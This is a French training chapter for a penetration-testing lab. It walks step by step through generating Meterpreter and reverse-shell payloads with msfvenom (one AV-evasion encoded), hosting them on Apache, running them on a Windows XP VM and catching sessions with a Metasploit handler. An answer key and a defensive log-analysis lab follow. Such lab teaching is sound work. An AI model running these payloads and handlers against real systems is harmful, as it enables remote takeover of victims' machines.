# Chapitre 3 — Payloads, C2 et analyse

Version du contenu : 8.3 — alignement sur le plan maître du chapitre 1.

## 1. Objectif

Ce chapitre vous guide pas à pas à travers la génération de payloads, l'hébergement des fichiers, leur livraison et leur exécution sur la VM Windows XP, l'analyse des canaux de commande et contrôle (C2) et l'analyse des traces d'exfiltration. Vous découvrirez comment produire, livrer, exécuter et documenter des payloads Windows XP avec `msfvenom`, puis comment analyser les journaux, les connexions réseau et les artefacts laissés dans le laboratoire.

> **Rôle du chapitre** — Le chapitre 3 est le chapitre **payloads, C2 et analyse technique**. Il produit les payloads, les héberge, puis analyse les traces techniques (journaux, connexions, fichiers, cron). Le chapitre 4 prend le relais pour le **rapport forensique standard**, la capture réseau complémentaire et la **restauration** de l'environnement. Les deux chapitres ne poursuivent pas le même livrable : le chapitre 3 collecte et interprète les artefacts ; le chapitre 4 consolide les preuves, rédige le rapport et restaure l'état sain.

Tous les labs s'effectuent sur le périmètre `192.168.56.0/24` (host-only `vboxnet0`) avec Kali Linux (`192.168.56.101`) comme machine attaquante et serveur de payloads, Metasploitable 2 (`192.168.56.103`) comme cible Linux principale, Windows XP (`192.168.56.104`) comme cible legacy des payloads et Windows Server 2016 (`192.168.56.102`) comme cible Active Directory.

> **Plan maître** — Ce chapitre exécute les lignes `Ch3 msfvenom` puis `Ch3 Lab1` à `Ch3 Lab3` du plan maître défini au **Chapitre 1, Lab 3**. Chaque étape met à jour `journal-execution.csv` et la couche Navigator. Ne recréez pas de plan local : reprenez la ligne existante et renseignez son statut.

**Avant de commencer :** assurez-vous d'avoir :

- chapitres 1 et 2 complétés ;
- snapshots pris sur chaque VM avant de commencer les analyses ;
- disque dur suffisant pour sauvegarder les fichiers PCAP et les rapports ;
- dossier `preuves/` créé à la racine du laboratoire.

## 2. Prérequis

| Élément | Détail |
|---|---|
| Machine attaquante | Kali Linux, IP `192.168.56.101`, 2 Go de RAM, 2 CPU, disque 20 Go dynamique |
| Cible Linux | Metasploitable 2, IP `192.168.56.103`, 2 Go de RAM, 2 CPU, disque 20 Go dynamique |
| Cible Windows XP | IP `192.168.56.104`, 1 Go de RAM, 1 CPU, disque 10 Go dynamique |
| Cible Active Directory | Windows Server 2016, IP `192.168.56.102` |
| Hôte | `192.168.56.1` (interface `vboxnet0`) |
| Outils | `tcpdump`, Wireshark, `searchsploit`, `sqlmap`, `msfvenom` (paquet `metasploit-framework`) |
| Connaissances | Terminal Linux, analyse forensique, bases réseau, génération de payload |
| Sécurité | Snapshot avant toute manipulation, rollback après |
| Services | Apache2 actif sur Kali : `service apache2 start`, répertoire `/var/www/payloads` |

> **Périmètre du lab** — Toutes les analyses, tous les exploits et tous les payloads de ce chapitre sont développés, exécutés et testés en réel sur les VMs du lab (`192.168.56.0/24`). Rien n'est simulé. Aucune activité réseau sortante vers Internet ; aucune cible réelle, aucun réseau de production.

## 3. Plan MITRE ATT&CK du chapitre

| Lab | Techniques | Tactiques | Statut | Sources de données |
|---|---|---|---|---|
| Ch3 msfvenom | T1587 / T1587.001 Develop Capabilities / Malware ; T1027 Obfuscated Files or Information ; T1204 / T1204.002 User Execution / Malicious File ; T1059.003 Windows Command Shell ; T1059.005 Visual Basic (théorique) | Resource Development ; Defense Evasion ; Execution | Couvert (lab) pour T1587 / T1587.001, T1027 et T1204 / T1204.002 ; T1059.003 couvert par le shell obtenu ; T1059.005 théorique | DS0022 File ; DS0017 Command |
| Ch3 Lab1 | T1119 Automated Collection (analyse défensive) ; T1083 File and Directory Discovery (analyse) ; T1059.004 Unix Shell (analyse) | Collection ; Discovery ; Execution | Couvert (analyse défensive) pour T1119 ; Couvert (analyse) pour T1083 et T1059.004 | DS0015 Application Log ; DS0022 File ; DS0017 Command |
| Ch3 Lab2 | T1040 Network Sniffing (analyse) ; T1071 Application Layer Protocol (analyse) ; T1571 Non-Standard Port (analyse) | Credential Access / Discovery ; Command and Control | Couvert (analyse) | DS0029 Network Traffic ; DS0009 Process ; DS0038 Domain Name |
| Ch3 Lab3 | T1041 Exfiltration Over C2 Channel (analyse) ; T1053.003 Scheduled Task/Job: Cron (analyse) ; T1071.001 Application Layer Protocol: Web Protocols (analyse) | Exfiltration ; Execution / Persistence / Privilege Escalation ; Command and Control | Couvert (analyse) | DS0029 Network Traffic ; DS0015 Application Log ; DS0022 File ; DS0003 Scheduled Job |
| Non applicable (chapitre) | T1046 Network Service Discovery ; T1069 Permission Groups Discovery ; T1047 Windows Management Instrumentation ; T1056 / T1056.001 Input Capture / Keylogging | — | Non applicable | — |

> **Règle de lecture** — « Couvert (lab) » signifie que la commande est exécutée dans le laboratoire, avec des valeurs de test ou sur les VMs du lab. « Couvert (analyse) » signifie que l'analyste observe et interprète les artefacts, sans exécuter l'action adverse. « Théorique » signifie que la technique est décrite et cartographiée, mais non exécutée.

## 4. Laboratoire préliminaire — génération de payloads Windows XP avec msfvenom

### 4.1 Contexte et objectif

Cette section vous apprend à générer des payloads Meterpreter et d'autres types de payloads pour la machine Windows XP cible avec `msfvenom`, dans le cadre de tests d'intrusion autorisés. L'objectif est de comprendre les différents types de payloads, les options d'encodage et les méthodes de livraison via le serveur HTTP intégré à Kali Linux.

**Objectif du laboratoire** — Générer, livrer, exécuter et documenter plusieurs types de payloads Windows XP via `msfvenom`, les héberger sur le serveur HTTP de Kali (`/var/www/payloads`), et comprendre les différences entre staged et stageless ainsi que les techniques d'encodage.

**Plan MITRE ATT&CK du laboratoire msfvenom**

- **Technique** : T1587 / T1587.001 Develop Capabilities / Malware (Resource Development) ; T1027 Obfuscated Files or Information (Defense Evasion) ; T1204 / T1204.002 User Execution / Malicious File (Execution) ; T1059.003 Windows Command Shell (Execution) ; T1059.005 Visual Basic (Execution, théorique).
- **Tactique** : Resource Development (TA0042) ; Defense Evasion (TA0005) ; Execution (TA0002).
- **Source de données** : DS0022 File (création des fichiers `.exe`) ; DS0017 Command (ligne de commande `msfvenom`).
- **Règle de détection** : création de fichiers exécutables dans `/var/www/payloads`, requêtes HTTP `GET` vers ces fichiers, alertes AV/EDR sur le payload généré.
- **Mitigation** : AppLocker, EDR, blocage des macros et des exécutables non signés, sensibilisation des utilisateurs.
- **Statut** : T1587 / T1587.001, T1027 et T1204 / T1204.002 couverts : les payloads sont générés, livrés et exécutés sur les VMs du lab ; T1059.003 couvert par le shell obtenu ; T1059.005 reste théorique.

### 4.2 Configuration du serveur de payloads

#### Étape 4.2.1 — Création du répertoire de partage

**Commande** : `mkdir -p /var/www/payloads`

**Contexte** : création du répertoire où seront stockés les payloads générés, accessible via HTTP depuis n'importe quelle machine du réseau host-only.

**Résultat attendu** : le répertoire `/var/www/payloads` est créé avec les permissions par défaut.

```bash
# Sur Kali : création du répertoire et preuve
mkdir -p preuves/ch3-msfvenom
sudo mkdir -p /var/www/payloads
ls -ld /var/www/payloads 2>&1 | tee preuves/ch3-msfvenom/repertoire-payloads.txt
```

**Ce que vous devez observer** :
- répertoire créé : `drwxr-xr-x` ou similaire ;
- chemin d'accès absolu confirmé ;
- preuve `preuves/ch3-msfvenom/repertoire-payloads.txt`.

**L'enregistrement** : notez le chemin d'accès dans votre rapport. Assurez-vous que Apache2 est configuré pour servir ce répertoire.

#### Étape 4.2.2 — Démarrage d'Apache2

**Commande** : `sudo service apache2 start`

**Contexte** : démarrage du serveur HTTP Apache qui servira les payloads aux cibles Windows.

**Résultat attendu** : Apache2 démarré et accès au répertoire `/var/www/payloads` via le navigateur ou `curl`.

```bash
# Sur Kali : démarrage d'Apache2 et preuve
sudo service apache2 start 2>&1 | tee preuves/ch3-msfvenom/apache2-start.txt
curl -s -o /dev/null -w "%{http_code}\n" http://192.168.56.101/payloads/ \
  2>&1 | tee -a preuves/ch3-msfvenom/apache2-start.txt
```

**Ce que vous devez observer** :
- message confirmant que Apache2 est démarré ;
- code HTTP `200` ou `403` selon la configuration du répertoire ;
- aucune erreur dans la sortie ;
- preuve `preuves/ch3-msfvenom/apache2-start.txt`.

**L'enregistrement** : confirmez le démarrage d'Apache2 et testez l'accès via `http://192.168.56.101/payloads/`.

### 4.3 msfvenom : rappel et syntaxe générale

#### Rappel : syntaxe de base

```bash
msfvenom -p <payload> LHOST=<adresse_Kali> LPORT=<port> [OPTIONS] -f <format> -o <fichier_sortie>
```

**Variables importantes** :
- `-p` : spécifie le payload à générer ;
- `LHOST` : adresse IP de la machine à l'écoute (Kali Linux) ;
- `LPORT` : port d'écoute sur la machine Kali ;
- `-f` : format de sortie (`exe`, `php`, `raw`, etc.) ;
- `-o` : chemin du fichier de sortie.

**Aide-mémoire** :

```bash
# Lister les payloads Windows disponibles
msfvenom --list payloads 2>&1 | grep windows | tee preuves/ch3-msfvenom/liste-payloads.txt

# Vérifier que Apache sert le répertoire
curl -s http://192.168.56.101/payloads/ 2>&1 | tee preuves/ch3-msfvenom/curl-payloads.txt
```

> **Périmètre du lab** — Toutes les analyses, tous les exploits et tous les payloads de ce chapitre sont développés, exécutés et testés en réel sur les VMs du lab (`192.168.56.0/24`). Rien n'est simulé. Aucune activité réseau sortante vers Internet ; aucune cible réelle, aucun réseau de production.

### 4.4 Différences : staged vs stageless

| Type | Payload exemple | Taille | Comportement |
|---|---|---|---|
| **Staged** | `windows/meterpreter/reverse_tcp` | ~5 Ko (premier stage) | Deux étapes : d'abord un petit stager, puis le payload complet téléchargé |
| **Stageless** | `windows/meterpreter_reverse_tcp` | ~200 Ko | Tout-en-un : le payload Meterpreter complet est injecté d'un seul bloc |

**Recommandation pour Windows XP** : le type **staged** est plus petit, mais il dépend d'un second téléchargement et devient moins fiable sur un réseau instable. Le type **stageless** est préférable lorsque la taille n'est pas une contrainte et que l'on veut éviter la dépendance au stager.

### 4.5 Création des payloads Windows XP principaux

#### Étape 4.5.1 — Payload stageless complet (Windows XP)

**Commande** : `msfvenom -p windows/meterpreter_reverse_tcp LHOST=192.168.56.101 LPORT=4444 -f exe -o /var/www/payloads/windows_xp_stageless.exe`

**Contexte** : génération d'un payload stageless Meterpreter pour Windows XP. Ce payload contient l'intégralité du Meterpreter et se connectera à Kali à l'adresse `192.168.56.101` sur le port `4444`.

**Résultat attendu** :
- fichier créé : `/var/www/payloads/windows_xp_stageless.exe` ;
- taille approximative : ~200 Ko ;
- aucune dépendance au stager externe.

```bash
# Sur Kali : payload stageless et preuve
sudo msfvenom -p windows/meterpreter_reverse_tcp LHOST=192.168.56.101 LPORT=4444 \
  -f exe -o /var/www/payloads/windows_xp_stageless.exe \
  2>&1 | tee preuves/ch3-msfvenom/msfvenom-stageless.txt
ls -lh /var/www/payloads/windows_xp_stageless.exe \
  2>&1 | tee -a preuves/ch3-msfvenom/msfvenom-stageless.txt
```

**Ce que vous devez observer** :
- message de succès de `msfvenom` ;
- fichier exécutable créé dans le répertoire ;
- taille du fichier enregistrée dans `preuves/ch3-msfvenom/msfvenom-stageless.txt`.

**L'enregistrement** : notez la commande exacte, la taille du fichier et le payload utilisé dans votre rapport de laboratoire. Le fichier est distribué sur le réseau host-only et exécuté sur la VM Windows XP du lab.

#### Étape 4.5.2 — Payload staged (Windows XP)

**Commande** : `msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.101 LPORT=4445 -f exe -o /var/www/payloads/windows_xp_staged.exe`

**Contexte** : génération d'un payload staged pour Windows XP. Le stager (première étape) sera exécuté en premier, puis il téléchargera le reste du Meterpreter.

**Résultat attendu** :
- fichier créé : `/var/www/payloads/windows_xp_staged.exe` ;
- taille approximative : ~5 Ko pour le stager initial ;
- dépendance au mécanisme de connexion inverse.

```bash
# Sur Kali : payload staged et preuve
sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.101 LPORT=4445 \
  -f exe -o /var/www/payloads/windows_xp_staged.exe \
  2>&1 | tee preuves/ch3-msfvenom/msfvenom-staged.txt
ls -lh /var/www/payloads/windows_xp_staged.exe \
  2>&1 | tee -a preuves/ch3-msfvenom/msfvenom-staged.txt
```

**Ce que vous devez observer** :
- message de succès de `msfvenom` ;
- fichier exécutable créé dans le répertoire ;
- taille du fichier enregistrée dans `preuves/ch3-msfvenom/msfvenom-staged.txt`.

**L'enregistrement** : notez la commande exacte, la taille du fichier et le type staged dans votre rapport. Le listener Metasploit est lancé sur Kali et le payload est exécuté sur la VM Windows XP du lab.

#### Étape 4.5.3 — Payload reverse_tcp simple (Windows XP)

**Commande** : `msfvenom -p windows/shell/reverse_tcp LHOST=192.168.56.101 LPORT=5555 -f exe -o /var/www/payloads/windows_xp_shell.exe`

**Contexte** : génération d'un payload shell reverse simple pour Windows XP. Contrairement à Meterpreter, celui-ci fournit un shell interactif basique.

**Résultat attendu** :
- fichier créé : `/var/www/payloads/windows_xp_shell.exe` ;
- taille du stager : quelques dizaines de Ko ; le shell complet est téléchargé ensuite ;
- shell basique sans les fonctionnalités étendues de Meterpreter.

```bash
# Sur Kali : payload shell reverse et preuve
sudo msfvenom -p windows/shell/reverse_tcp LHOST=192.168.56.101 LPORT=5555 \
  -f exe -o /var/www/payloads/windows_xp_shell.exe \
  2>&1 | tee preuves/ch3-msfvenom/msfvenom-shell.txt
ls -lh /var/www/payloads/windows_xp_shell.exe \
  2>&1 | tee -a preuves/ch3-msfvenom/msfvenom-shell.txt
```

**Ce que vous devez observer** :
- message de succès de `msfvenom` ;
- fichier exécutable créé dans le répertoire ;
- taille du fichier enregistrée dans `preuves/ch3-msfvenom/msfvenom-shell.txt`.

**L'enregistrement** : notez la commande exacte, la taille du fichier et le type de payload dans votre rapport. Ce type de payload est souvent utilisé pour des accès rapides sans Meterpreter.

### 4.6 Encodage et obfuscation des payloads

Les payloads générés par défaut peuvent être détectés par les antivirus et les solutions EDR. Cette section couvre les techniques d'encodage pour contourner les détections de base.

#### Étape 4.6.1 — Utilisation de l'encodeur x86/shikata_ga_nai

**Commande** : `msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.101 LPORT=4444 -e x86/shikata_ga_nai -i 3 -f exe -o /var/www/payloads/windows_xp_encoded.exe`

**Contexte** : application de l'encodeur `shikata_ga_nai` (XOR dynamique) au payload Meterpreter. L'option `-i 3` applique l'encodage trois fois pour obfusquer le payload.

**Résultat attendu** :
- fichier créé : `/var/www/payloads/windows_xp_encoded.exe` ;
- payload encodé mais fonctionnel après décodage à l'exécution ;
- taille légèrement augmentée à cause de la boucle d'encodage.

```bash
# Sur Kali : payload encodé et preuve
sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.101 LPORT=4444 \
  -e x86/shikata_ga_nai -i 3 -f exe -o /var/www/payloads/windows_xp_encoded.exe \
  2>&1 | tee preuves/ch3-msfvenom/msfvenom-encoded.txt
ls -lh /var/www/payloads/windows_xp_encoded.exe \
  2>&1 | tee -a preuves/ch3-msfvenom/msfvenom-encoded.txt
```

**Ce que vous devez observer** :
- message de succès de `msfvenom` avec indication de l'encodage ;
- fichier exécutable créé avec une taille légèrement supérieure ;
- preuve `preuves/ch3-msfvenom/msfvenom-encoded.txt`.

**L'enregistrement** : notez la commande, le nombre d'itérations d'encodage (`-i 3`) et la différence de taille entre le payload brut et le payload encodé.

#### Étape 4.6.2 — Comparaison des tailles de payload

**Commande** : `ls -lh /var/www/payloads/*.exe`

**Contexte** : comparaison visuelle des tailles des différents payloads générés.

**Résultat attendu** :
- affichage des tailles de tous les fichiers `.exe` dans le répertoire ;
- payload stageless le plus grand (~200 Ko) ;
- payload staged le plus petit (~5 Ko pour le stager) ;
- payload encodé intermédiaire.

```bash
# Sur Kali : comparaison des tailles et preuve
ls -lh /var/www/payloads/*.exe 2>&1 | tee preuves/ch3-msfvenom/comparaison-tailles.txt
```

**Ce que vous devez observer** :
- liste des fichiers avec leurs tailles ;
- différences significatives selon le type et l'encodage ;
- preuve `preuves/ch3-msfvenom/comparaison-tailles.txt`.

**L'enregistrement** : documentez les tailles observées et les relations entre les types de payloads et l'encodage dans votre rapport. Notez que l'encodage augmente la taille mais rend la détection par signature plus difficile.

### 4.7 Exécution et test réel des payloads sur Windows XP

Les payloads générés en 4.5 et 4.6 ne restent pas à l'état de fichiers : ils sont livrés et exécutés sur la VM Windows XP `192.168.56.104`. Le test de référence utilise le payload stageless Meterpreter et le port `4444` ; la même procédure s'applique aux autres payloads en ajustant `PAYLOAD` et `LPORT`.

#### Étape 4.7.1 — Lancer le handler Metasploit sur Kali

**Commande** : `msfconsole -q -r preuves/ch3-msfvenom/handler-xp.rc`

**Contexte** : ouverture du listener qui recevra la connexion inverse du payload exécuté sur Windows XP.

**Résultat attendu** : le handler écoute sur `192.168.56.101:4444` et attend une session.

```bash
# Sur Kali : préparation du handler et preuve
cat > preuves/ch3-msfvenom/handler-xp.rc <<'RC'
use exploit/multi/handler
set PAYLOAD windows/meterpreter_reverse_tcp
set LHOST 192.168.56.101
set LPORT 4444
set ExitOnSession false
exploit -j
RC
msfconsole -q -r preuves/ch3-msfvenom/handler-xp.rc \
  2>&1 | tee preuves/ch3-msfvenom/handler-xp.txt
```

**Ce que vous devez observer** :
- `Started reverse TCP handler on 192.168.56.101:4444` ;
- le handler reste actif après le lancement ;
- preuve `preuves/ch3-msfvenom/handler-xp.txt`.

**L'enregistrement** : laissez le terminal du handler ouvert et passez à la livraison.

#### Étape 4.7.2 — Livrer et exécuter le payload sur Windows XP

**Commande** : ouvrir `http://192.168.56.101/payloads/windows_xp_stageless.exe` dans le navigateur de Windows XP, enregistrer le fichier dans `C:\Temp\`, puis l'exécuter.

**Contexte** : la VM Windows XP télécharge le payload depuis le serveur HTTP de Kali et l'exécute. C'est l'étape de livraison et d'exécution utilisateur (`T1204.002`).

**Résultat attendu** : le fichier est téléchargé, puis une connexion inverse apparaît dans le handler sur Kali.

**Preuve** : dans le handler, `sessions -l` affiche une session Meterpreter ouverte.

**L'enregistrement** : notez l'heure de téléchargement et l'heure d'ouverture de la session.

#### Étape 4.7.3 — Constater la session et collecter la preuve

**Commande** : `spool preuves/ch3-msfvenom/session-xp.txt`, `sessions -l`, `sessions -i 1`, `sysinfo`, `getuid`, `exit`, `spool off`

**Contexte** : vérification que le payload donne bien un accès réel et collecte des informations d'identification de la VM.

**Résultat attendu** : la session affiche `meterpreter`, `sysinfo` retourne Windows XP, `getuid` retourne l'utilisateur d'exécution.

```bash
# Dans msfconsole, sur Kali
spool preuves/ch3-msfvenom/session-xp.txt
sessions -l
sessions -i 1
sysinfo
getuid
exit
spool off
```

**Preuve** : `preuves/ch3-msfvenom/session-xp.txt`, avec la sortie de `sessions -l`, `sysinfo` et `getuid`.

**L'enregistrement** : conservez la preuve et fermez la session.

#### Étape 4.7.4 — Nettoyer le lab

**Commande** : `sessions -K`, puis `exit -y` dans msfconsole, puis restauration du snapshot Windows XP.

**Contexte** : fermeture des sessions et retour à l'état sain de la VM.

**Résultat attendu** : aucune session active, handler arrêté, VM restaurée.

**L'enregistrement** : notez le rollback dans le journal d'exécution.

**Test des autres payloads** — répétez les étapes 4.7.1 à 4.7.4 en adaptant le handler et le port :

| Payload | Fichier | Handler | LPORT |
|---|---|---|---|
| Stageless Meterpreter | `windows_xp_stageless.exe` | `windows/meterpreter_reverse_tcp` | 4444 |
| Staged Meterpreter | `windows_xp_staged.exe` | `windows/meterpreter/reverse_tcp` | 4445 |
| Shell reverse | `windows_xp_shell.exe` | `windows/shell/reverse_tcp` | 5555 |
| Encoded Meterpreter | `windows_xp_encoded.exe` | `windows/meterpreter/reverse_tcp` | 4444 |

Pour le payload shell, `sessions -i` ouvre un shell `cmd.exe` et non Meterpreter ; utilisez `whoami` et `hostname` au lieu de `sysinfo` et `getuid`.

### 4.8 Corrigé — Laboratoire msfvenom

**Résolution détaillée :**

**Étape 4.1 — Répertoire et serveur HTTP**
- **Commandes** : `sudo mkdir -p /var/www/payloads`, `sudo service apache2 start`, `curl -s -o /dev/null -w "%{http_code}\n" http://192.168.56.101/payloads/`.
- **Résultat attendu** :
  - `ls -ld /var/www/payloads` affiche un répertoire avec `drwxr-xr-x` (ou équivalent) ;
  - Apache2 démarre sans erreur ;
  - `curl` retourne `200` si l'index est autorisé, `403` si le listing est interdit mais le répertoire servi.
- **Explication** : Apache sert `/var/www/html` par défaut ; `/var/www/payloads` est accessible si la racine documentaire ou une alias couvre ce chemin. Un code `404` indique que le chemin n'est pas servi.
- **Piège courant** : conclure à un échec sur un code `403` ; le répertoire peut être servi tout en interdisant le listing.

**Résultat attendu final** :
- répertoire créé ;
- service Apache actif ;
- preuves `preuves/ch3-msfvenom/repertoire-payloads.txt` et `apache2-start.txt` présentes.

**Étape 4.2 — Payload stageless**
- **Commande** : `sudo msfvenom -p windows/meterpreter_reverse_tcp LHOST=192.168.56.101 LPORT=4444 -f exe -o /var/www/payloads/windows_xp_stageless.exe`.
- **Résultat attendu** :
  - message `Payload size: ...` et sauvegarde du fichier ;
  - `ls -lh` affiche un fichier de l'ordre de 200 Ko ;
  - `file` identifie un exécutable PE32.
- **Explication** : le payload stageless contient Meterpreter complet ; la taille exacte dépend de la version de Metasploit.
- **Piège courant** : comparer les tailles entre versions de `msfvenom` et conclure à une erreur ; seule la cohérence interne du laboratoire compte.

**Résultat attendu final** :
- fichier `windows_xp_stageless.exe` créé ;
- taille et type documentés ;
- preuve `msfvenom-stageless.txt` présente.

**Étape 4.3 — Payload staged**
- **Commande** : `sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.101 LPORT=4445 -f exe -o /var/www/payloads/windows_xp_staged.exe`.
- **Résultat attendu** :
  - fichier créé, nettement plus petit que le stageless (stager initial) ;
  - `file` identifie un exécutable PE32.
- **Explication** : le stager établit la connexion inverse, puis télécharge le second stage. La taille du fichier initial ne contient pas tout Meterpreter.
- **Piège courant** : croire que le fichier staged contient déjà l'intégralité du payload ; le second stage arrive après l'exécution.

**Résultat attendu final** :
- fichier `windows_xp_staged.exe` créé ;
- taille du stager documentée ;
- preuve `msfvenom-staged.txt` présente.

**Étape 4.4 — Payload shell reverse**
- **Commande** : `sudo msfvenom -p windows/shell/reverse_tcp LHOST=192.168.56.101 LPORT=5555 -f exe -o /var/www/payloads/windows_xp_shell.exe`.
- **Résultat attendu** :
  - fichier créé ;
  - taille du stager de l'ordre de quelques dizaines de Ko ;
  - `file` identifie un exécutable PE32.
- **Explication** : `windows/shell/reverse_tcp` est un payload staged qui fournit un shell `cmd.exe`, sans les fonctions Meterpreter.
- **Piège courant** : attendre la taille d'un payload stageless ; ce payload est stage-based et le shell complet est téléchargé ensuite.

**Résultat attendu final** :
- fichier `windows_xp_shell.exe` créé ;
- type de payload documenté ;
- preuve `msfvenom-shell.txt` présente.

**Étape 4.5 — Encodage**
- **Commande** : `sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.101 LPORT=4444 -e x86/shikata_ga_nai -i 3 -f exe -o /var/www/payloads/windows_xp_encoded.exe`.
- **Résultat attendu** :
  - fichier créé ;
  - taille légèrement supérieure au payload staged non encodé ;
  - mention de l'encodeur et des trois itérations dans la sortie.
- **Explication** : l'encodage transforme la représentation du payload ; il ne garantit pas l'évasion des antivirus modernes.
- **Piège courant** : considérer l'encodage comme une garantie de furtivité ; les signatures et les analyses comportementales peuvent détecter le payload.

**Résultat attendu final** :
- fichier `windows_xp_encoded.exe` créé ;
- différence de taille documentée ;
- preuve `msfvenom-encoded.txt` présente.

**Étape 4.6 — Comparaison**
- **Commande** : `ls -lh /var/www/payloads/*.exe`.
- **Résultat attendu** :

| Fichier | Ordre de grandeur | Interprétation |
|---|---|---|
| `windows_xp_stageless.exe` | ~200 Ko | Payload complet autonome |
| `windows_xp_staged.exe` | Quelques Ko à quelques dizaines de Ko | Stager initial |
| `windows_xp_shell.exe` | Quelques dizaines de Ko | Stager du shell |
| `windows_xp_encoded.exe` | Taille du staged + surcoût | Payload encodé |

- **Explication** : les tailles varient selon la version de Metasploit et les options ; comparer les ordres de grandeur, pas les octets exacts.
- **Piège courant** : classer le payload shell comme stageless à cause de sa taille ; vérifier le nom du payload (`shell/reverse_tcp` est staged).

**Résultat attendu final** :
- tableau de comparaison complété ;
- preuve `comparaison-tailles.txt` présente.

**Étape 4.7 — Exécution réelle sur Windows XP**
- **Commandes** : handler `multi/handler`, livraison `http://192.168.56.101/payloads/windows_xp_stageless.exe`, `sessions -l`, `sysinfo`, `getuid`.
- **Résultat attendu** : `Started reverse TCP handler`, session Meterpreter ouverte, `sysinfo` retourne Windows XP, `getuid` retourne l'utilisateur d'exécution.
- **Explication** : le payload est livré par HTTP et exécuté sur la VM Windows XP ; la session prouve l'exécution réelle.
- **Piège courant** : oublier `set ExitOnSession false` et perdre le handler après la première session ; vérifier que `LHOST` correspond à `192.168.56.101`.

**Résultat attendu final** :
- session Meterpreter ouverte sur Windows XP ;
- preuves `handler-xp.txt` et `session-xp.txt` présentes ;
- rollback effectué après le test.

**Conclusion du laboratoire msfvenom** :
- quatre fichiers générés et documentés ;
- différence staged/stageless comprise ;
- encodage replacé dans ses limites ;
- payloads exécutés sur les VMs du lab ;
- ATT&CK cartographié : T1587 / T1587.001, T1027 et T1204 / T1204.002 couverts ; T1059.003 couvert par le shell obtenu ; T1059.005 théorique.

---

## Lab 1 — Analyse des traces d'exécution et collecte de preuves

### 1.1 Contexte et objectif

Cette première étape vous apprend à analyser les fichiers de journal système et à collecter des preuves forensiques sur la machine cible compromise. L'objectif est d'identifier les indicateurs de compromission (IoC) et de documenter la chronologie des événements liés à la chaîne payload/C2.

**Objectif de Lab 1** — Collecter et analyser les preuves forensiques dans les journaux système, identifier les indicateurs de compromission (IoC) et documenter la chronologie des événements.

**Plan MITRE ATT&CK de Lab 1**

- **Technique** : T1119 Automated Collection (Collection, analyse défensive) ; T1083 File and Directory Discovery (Discovery, analyse) ; T1059.004 Unix Shell (Execution, analyse des commandes observées).
- **Tactique** : Collection (TA0009) ; Discovery (TA0007) ; Execution (TA0002).
- **Source de données** : DS0015 Application Log (auth.log) ; DS0022 File (exécutables nouveaux ou modifiés) ; DS0017 Command (commandes shell observées).
- **Règle de détection** : événements d'authentification, commandes système suspectes, fichiers exécutables récents.
- **Mitigation** : journalisation centrale, surveillance des fichiers critiques, intégrité des fichiers (FIM), analyse régulière des journaux.
- **Statut** : Couvert (analyse défensive) pour T1119 ; Couvert (analyse) pour T1083 et T1059.004.

### 1.2 Étapes de Lab 1

#### Étape 1.1 — Analyse du fichier auth.log

**Commande** : `grep -E "Accepted|Failed" /var/log/auth.log`

**Contexte** : sur la machine cible Linux (`192.168.56.103`), après avoir obtenu des privilèges root. L'objectif est d'analyser le journal d'authentification principal.

**Résultat attendu** : extraits des événements d'authentification réussie et échouée avec horodatages.

```bash
# Sur la cible : analyse des logs d'authentification
mkdir -p preuves/ch3-lab1
sudo grep -E "Accepted|Failed" /var/log/auth.log \
  2>&1 | tee preuves/ch3-lab1/auth-accepted-failed.txt
```

**Ce que vous devez observer** :
- lignes contenant `Accepted` pour les connexions SSH réussies ;
- lignes contenant `Failed` pour les échecs d'authentification ;
- horodatages et noms d'utilisateur associés ;
- preuve `preuves/ch3-lab1/auth-accepted-failed.txt`.

**L'enregistrement** : notez les extraits pertinents dans votre rapport forensique. Conservez le fichier de preuve.

#### Étape 1.2 — Recherche d'activités suspectes

**Commande** : `grep -i "sudo\|chmod\|chown\|curl\|wget" /var/log/auth.log`

**Contexte** : sur la cible Linux, après avoir extrait les événements d'authentification. L'objectif est de rechercher les modèles d'activités suspectes.

**Résultat attendu** : lignes contenant des commandes système suspectes avec horodatages.

```bash
# Sur la cible : recherche d'activités suspectes
sudo grep -i "sudo\|chmod\|chown\|curl\|wget" /var/log/auth.log \
  2>&1 | tee preuves/ch3-lab1/activites-suspectes.txt
```

**Ce que vous devez observer** :
- lignes contenant des commandes système suspectes ;
- horodatages et utilisateurs associés aux activités suspectes ;
- preuve `preuves/ch3-lab1/activites-suspectes.txt`.

**L'enregistrement** : notez les activités suspectes identifiées dans votre rapport forensique. Conservez le fichier de preuve.

#### Étape 1.3 — Identification des exécutables nouveaux ou modifiés

**Commande** : `find / -newer /etc/passwd -type f 2>/dev/null`

**Contexte** : sur la cible Linux, après avoir analysé les journaux d'authentification. L'objectif est d'identifier les exécutables nouveaux ou modifiés récemment.

**Résultat attendu** : liste des fichiers exécutables créés ou modifiés après la dernière modification de `/etc/passwd`.

```bash
# Sur la cible : exécutables nouveaux ou modifiés
sudo find / -newer /etc/passwd -type f 2>/dev/null \
  | tee preuves/ch3-lab1/executables-recents.txt
```

**Ce que vous devez observer** :
- liste des fichiers exécutables nouveaux ou modifiés avec leur taille et leur chemin ;
- fichiers inconnus ou pouvant être des implants ;
- preuve `preuves/ch3-lab1/executables-recents.txt`.

**L'enregistrement** : notez les exécutables nouveaux ou modifiés dans votre rapport forensique. Conservez le fichier de preuve.

#### Étape 1.4 — Documentation de la chronologie

**Actions** :
1. Compiler tous les horodatages et événements identifiés.
2. Classer les événements par ordre chronologique.
3. Documenter la séquence des événements de l'attaque.

```bash
# Sur Kali : consolidation de la chronologie
cat preuves/ch3-lab1/auth-accepted-failed.txt \
    preuves/ch3-lab1/activites-suspectes.txt \
    preuves/ch3-lab1/executables-recents.txt \
  > preuves/ch3-lab1/chronologie-brute.txt 2>&1
```

**L'enregistrement** : rédigez la chronologie de l'attaque dans votre rapport forensique en vous basant sur les extraits de journaux, les activités suspectes et les exécutables nouvellement créés. Conservez `preuves/ch3-lab1/chronologie-brute.txt`.

### 1.3 Plan d'attaque de Lab 1 à remplir en temps réel

| # | Étape | Technique ATT&CK | ID | Statut | Résultat observé | Détection observée | Mitigation applicable | Notes temps réel |
|---|---|---|---|---|---|---|---|---|
| 1 | Analyse auth.log | Automated Collection | T1119 | | | | | |
| 2 | Recherche d'activités suspectes | Unix Shell (analyse) | T1059.004 | | | | | |
